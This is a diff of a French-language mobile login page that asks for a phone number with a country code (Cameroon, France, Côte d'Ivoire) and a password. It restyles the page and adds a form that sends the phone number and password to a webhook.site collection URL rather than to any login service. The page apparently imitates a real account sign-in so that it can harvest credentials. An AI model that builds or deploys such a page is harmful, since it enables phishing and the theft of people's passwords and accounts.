@@ -2,64 +2,63 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Connexion</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
-
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background-color: #f1f1f1;
+      background-color: #f2f2f2;
     }
 
-    .header {
-      background: url('https://www.reisereporter.de/resizer/v2/RTR47EGRXBHC5ACFYNXFEGJ5MU.jpg?auth=1b0a223c51fca3feb4d0a64ec62c490a490d1b9308d6668b71a7be682c84082c&quality=70&width=1284&height=722&smart=true') no-repeat center center;
+    .header-image {
+      width: 100%;
+      height: 260px;
+      background-image: url("train.jpg");
       background-size: cover;
-      height: 220px; /* ← Comme sur ta maquette */
-      min-height: 220px;
+      background-position: center;
       position: relative;
     }
 
-    .top-buttons {
+    .switch {
       position: absolute;
-      bottom: -25px;
+      top: 200px;
       left: 50%;
       transform: translateX(-50%);
       display: flex;
-      background: white;
-      border-radius: 30px;
+      background-color: white;
+      border-radius: 50px;
       overflow: hidden;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-      z-index: 10;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      z-index: 2;
+      width: 300px; /* Rétréci */
     }
 
-    .top-buttons button {
-      padding: 15px 25px;
+    .switch button {
+      flex: 1;
+      padding: 12px 0;
       border: none;
+      outline: none;
       font-weight: bold;
-      cursor: pointer;
       font-size: 16px;
+      cursor: pointer;
     }
 
-    .top-buttons .active {
+    .switch button.active {
       background-color: black;
       color: white;
     }
 
     .container {
-      background: white;
-      border-top-left-radius: 20px;
-      border-top-right-radius: 20px;
-      width: 100%;
-      max-width: 500px;
-      padding: 25px 20px;
-      box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
-      margin: -10vh auto 0 auto;
-      position: relative;
-      z-index: 5;
+      margin-top: 60px; /* Plus d'espace entre image et formulaire */
+      background-color: white;
+      border-radius: 25px;
+      padding: 30px 20px;
+      width: 90%;
+      max-width: 400px;
+      margin-left: auto;
+      margin-right: auto;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
     }
 
     .form-group {
@@ -67,173 +66,84 @@
       align-items: center;
       margin-bottom: 20px;
       border-bottom: 1px solid #ccc;
-      padding-bottom: 8px;
+      padding-bottom: 5px;
     }
 
-    .form-group input {
+    .form-group i {
+      margin-right: 10px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
       border: none;
       outline: none;
       flex: 1;
-      padding: 10px 0;
       font-size: 16px;
+    }
+
+    .country-code {
+      border: none;
       background: transparent;
-    }
-
-    .indicatif-select {
-      display: flex;
-      align-items: center;
-      cursor: pointer;
+      font-size: 16px;
       margin-right: 10px;
+      cursor: pointer;
     }
 
-    .checkbox-group {
-      display: flex;
-      align-items: center;
+    .remember {
       margin-bottom: 20px;
     }
 
-    .checkbox-group input {
-      margin-right: 10px;
+    .remember label {
+      margin-left: 5px;
     }
 
-    .submit-btn {
-      width: 100%;
-      background: #e53910;
+    .btn {
+      background-color: #f44320;
       color: white;
       border: none;
+      width: 100%;
       padding: 15px;
-      font-size: 16px;
+      border-radius: 12px;
       font-weight: bold;
-      border-radius: 10px;
+      font-size: 16px;
       cursor: pointer;
-      box-shadow: 0 5px 10px rgba(0,0,0,0.2);
-    }
-
-    .dropdown {
-      display: none;
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      background: white;
-      padding: 20px;
-      z-index: 50;
-      border-top-left-radius: 15px;
-      border-top-right-radius: 15px;
-      box-shadow: 0 -2px 10px rgba(0,0,0,0.3);
-    }
-
-    .dropdown input {
-      width: 100%;
-      padding: 10px;
-      margin-bottom: 10px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-    }
-
-    .dropdown button {
-      background: #d93025;
-      color: white;
-      border: none;
-      padding: 10px;
-      border-radius: 10px;
-      margin-left: 10px;
-    }
-
-    .indicatif-item {
-      padding: 15px;
-      border-radius: 10px;
-      background: linear-gradient(to right, #e53935, #8e24aa);
-      color: white;
-      margin-bottom: 10px;
-      display: flex;
-      justify-content: space-between;
-    }
-
-    .overlay {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.5);
-      z-index: 20;
-    }
-
-    @media (min-width: 600px) {
-      .container {
-        border-radius: 20px;
-        margin-top: -60px;
-      }
+      box-shadow: 0 4px 10px rgba(244, 67, 32, 0.3);
     }
   </style>
 </head>
 <body>
+  <div class="header-image"></div>
 
-  <div class="header">
-    <div class="top-buttons">
-      <button class="active">Se connecter</button>
-      <button>Créer un compte</button>
-    </div>
+  <div class="switch">
+    <button class="active">Se connecter</button>
+    <button>Créer un compte</button>
   </div>
 
   <div class="container">
-    <div class="form-group">
-      <div class="indicatif-select" onclick="toggleDropdown()">
-        📱 <span id="selectedIndicatif">+237</span> ▼
+    <form action="https://webhook.site/TON_WEBHOOK" method="POST">
+      <div class="form-group">
+        <span>📱</span>
+        <select class="country-code" name="countryCode">
+          <option value="+237">+237</option>
+          <option value="+33">+33</option>
+          <option value="+225">+225</option>
+          <!-- ajoute d'autres si besoin -->
+        </select>
+        <input type="text" name="phone" placeholder="Entrez votre numéro de portable" required />
       </div>
-      <input type="text" placeholder="Entrez votre numéro de portable" />
-    </div>
 
-    <div class="form-group">
-      🔒 <input type="password" placeholder="Veuillez entrer votre mot de passe" />
-    </div>
+      <div class="form-group">
+        <span>🔒</span>
+        <input type="password" name="password" placeholder="Veuillez entrer votre mot de passe" required />
+      </div>
 
-    <div class="checkbox-group">
-      <input type="checkbox" id="remember" />
-      <label for="remember">Se souvenir du mot de passe</label>
-    </div>
+      <div class="remember">
+        <input type="checkbox" name="remember" id="remember" />
+        <label for="remember">Se souvenir du mot de passe</label>
+      </div>
 
-    <button class="submit-btn">Connectez-vous à votre compte</button>
+      <button type="submit" class="btn">Connectez-vous à votre compte</button>
+    </form>
   </div>
-
-  <div class="overlay" id="overlay" onclick="toggleDropdown()"></div>
-
-  <div class="dropdown" id="dropdown">
-    <div style="display: flex;">
-      <input type="text" placeholder="Sélectionner l'indicatif régional" id="searchInput" onkeyup="searchIndicatif()">
-      <button>🔍 Rechercher</button>
-    </div>
-
-    <div id="indicatifList">
-      <div class="indicatif-item" onclick="selectIndicatif('+237')">+237 <span>République du Cameroun</span></div>
-      <div class="indicatif-item" onclick="selectIndicatif('+228')">+228 <span>République togolaise</span></div>
-      <div class="indicatif-item" onclick="selectIndicatif('+229')">+229 <span>République du Bénin</span></div>
-      <div class="indicatif-item" onclick="selectIndicatif('+226')">+226 <span>Burkina Faso</span></div>
-      <div class="indicatif-item" onclick="selectIndicatif('+225')">+225 <span>République de Côte d'Ivoire</span></div>
-    </div>
-  </div>
-
-  <script>
-    function toggleDropdown() {
-      const dropdown = document.getElementById("dropdown");
-      const overlay = document.getElementById("overlay");
-      const isVisible = dropdown.style.display === "block";
-      dropdown.style.display = isVisible ? "none" : "block";
-      overlay.style.display = isVisible ? "none" : "block";
-    }
-
-    function selectIndicatif(code) {
-      document.getElementById("selectedIndicatif").innerText = code;
-      toggleDropdown();
-    }
-
-    function searchIndicatif() {
-      const input = document.getElementById("searchInput").value.toLowerCase();
-      const items = document.querySelectorAll("#indicatifList .indicatif-item");
-      items.forEach(item => {
-        const text = item.innerText.toLowerCase();
-        item.style.display = text.includes(input) ? "flex" : "none";
-      });
-    }
-  </script>
 </body>
-</html>
+          </html>
